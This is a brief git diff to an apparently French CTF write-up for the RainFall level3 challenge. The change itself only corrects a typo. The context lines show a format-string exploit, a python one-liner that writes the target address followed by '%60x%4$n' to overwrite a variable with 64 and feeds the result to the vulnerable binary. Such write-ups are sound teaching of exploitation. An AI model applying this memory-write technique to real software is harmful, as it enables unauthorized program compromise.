@@ -107,7 +107,7 @@ level3@RainFall:~$ cat /tmp/exploit | ./level3
 ? 804988c // %4$x permet de spécifié le 4e élément.
 ```
 
-En partans du dernier script, il suffit de mettre nos 60 espaces "%60x", et de donner l'adresse de m a %n pour écrire 64 dedans (0x40 en hexa)
+En partant du dernier script, il suffit de mettre nos 60 espaces "%60x", et de donner l'adresse de m a %n pour écrire 64 dedans (0x40 en hexa)
 
 ```
 level3@RainFall:~$ python -c 'print("\x8c\x98\x04\x08" + "%60x" + "%4$n")' > /tmp/exploit
